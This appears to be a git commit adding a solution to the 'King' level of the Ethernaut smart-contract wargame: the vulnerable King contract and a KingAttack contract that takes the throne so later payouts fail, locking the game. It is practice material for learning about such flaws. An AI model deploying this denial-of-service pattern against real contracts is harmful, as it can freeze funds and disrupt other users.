b656928d62ba353b70c6ec7c9009803b59dbebfe
Yannick <y-chi@example.com>
2022-08-02 21:16:13 +0200

    King of the Ether

---
+++ Ethernaut/brownie/contracts/King.sol
@@ -0,0 +1,32 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract King {
+    address payable king;
+    uint256 public prize;
+    address payable public owner;
+
+    constructor() public payable {
+        owner = msg.sender;
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    receive() external payable {
+        require(msg.value >= prize || msg.sender == owner);
+        king.transfer(msg.value);
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    function _king() public view returns (address payable) {
+        return king;
+    }
+}
+
+contract KingAttack {
+    function attack(address payable _king) public payable {
+        (bool result, ) = _king.call{value: msg.value}("");
+        if (!result) revert();
+    }
+}
